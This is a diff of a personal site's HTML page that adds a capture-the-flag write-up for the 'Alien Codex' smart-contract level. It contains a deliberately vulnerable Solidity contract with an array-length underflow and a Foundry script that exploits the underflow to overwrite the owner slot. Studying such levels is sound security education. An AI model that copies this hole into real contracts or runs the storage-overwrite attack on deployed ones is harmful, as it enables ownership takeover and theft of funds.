@@ -12,7 +12,9 @@
 <link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
 
   <title>Alien Codex – jfrancai</title>
-  <meta name="description" content="coming soon" />
+  <meta name="description" content="You’ve uncovered an Alien contract. Claim ownership to complete the level.
+Things that might help
+Understanding how array storage works Understanding ABI specifications Using a very underhanded approach // SPDX-License-Identifier: MIT pragma solidity ^0.5.0; import &#39;../helpers/Ownable-05.sol&#39;; contract AlienCodex is Ownable { bool public contact; bytes32[] public codex; modifier contacted() { assert(contact); _; } function makeContact() public { contact = true; } function record(bytes32 _content) contacted public { codex.push(_content); } function retract() contacted public { codex." />
 
   
 
@@ -826,7 +828,113 @@
         <div class="content">
           <h1>Alien Codex</h1>
           <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">
-<p>coming soon</p>
+<p>You&rsquo;ve uncovered an Alien contract. Claim ownership to complete the level.</p>
+<p>Things that might help</p>
+<ul>
+<li>Understanding how array storage works</li>
+<li>Understanding <a href="https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html" target="_blank" rel="noopener">ABI specifications</a></li>
+<li>Using a very <code>underhanded</code> approach</li>
+</ul>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#39;../helpers/Ownable-05.sol&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">AlienCodex</span> <span class="k">is</span> <span class="n">Ownable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">bool</span> <span class="k">public</span> <span class="n">contact</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">bytes32</span><span class="p">[]</span> <span class="k">public</span> <span class="n">codex</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">modifier</span> <span class="nf">contacted</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">assert</span><span class="p">(</span><span class="n">contact</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">makeContact</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">contact</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">record</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_content</span><span class="p">)</span> <span class="n">contacted</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">codex</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">_content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">retract</span><span class="p">()</span> <span class="n">contacted</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">codex</span><span class="p">.</span><span class="n">length</span><span class="o">--</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">revise</span><span class="p">(</span><span class="kt">uint</span> <span class="n">i</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">_content</span><span class="p">)</span> <span class="n">contacted</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">codex</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">_content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>Solution:</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/console.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">AlienCodex</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">contact</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">codex</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bytes32</span><span class="p">[]</span> <span class="k">memory</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">makeContact</span><span class="p">()</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">retract</span><span class="p">()</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">revise</span><span class="p">(</span><span class="kt">uint</span> <span class="n">i</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">_content</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">owner</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">POC</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">deployerPrivateKey</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">&#34;PRIVATE_KEY&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">pubKey</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">&#34;PUBLIC_KEY&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">&#34;INSTANCE_19&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">deployerPrivateKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">AlienCodex</span> <span class="n">codex</span> <span class="o">=</span> <span class="n">AlienCodex</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// codex array at slot 1 =&gt; first elt in the array at slot keccak256(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint</span> <span class="n">eltSlot</span> <span class="o">=</span> <span class="kt">uint</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// owner address is stored on the first 20 bytes of slot 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint</span> <span class="n">distanceFromSlot0</span> <span class="o">=</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint</span><span class="p">).</span><span class="nb">max</span> <span class="o">-</span> <span class="n">eltSlot</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">codex</span><span class="p">.</span><span class="n">makeContact</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// length underflow; now codex is of length type(uint).max
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// which allows us to reach every possible slot of the contract
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">codex</span><span class="p">.</span><span class="n">retract</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// write attacker&#39;s address at slot 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">codex</span><span class="p">.</span><span class="n">revise</span><span class="p">(</span><span class="n">distanceFromSlot0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="kt">bytes32</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="n">pubKey</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">logAddress</span><span class="p">(</span><span class="n">codex</span><span class="p">.</span><span class="n">owner</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>This level exploits the fact that the EVM doesn&rsquo;t validate an array&rsquo;s ABI-encoded length vs its actual payload.</p>
+<p>Additionally, it exploits the arithmetic underflow of array length,
+by expanding the array&rsquo;s bounds to the entire storage area of <code>2^256</code>. The user is then able to modify all contract storage.</p>
+<p>Both vulnerabilities are inspired by 2017&rsquo;s <a href="https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079" target="_blank" rel="noopener">Underhanded coding contest</a></p>
 
         </div>
         <div class="mt-16"></div>
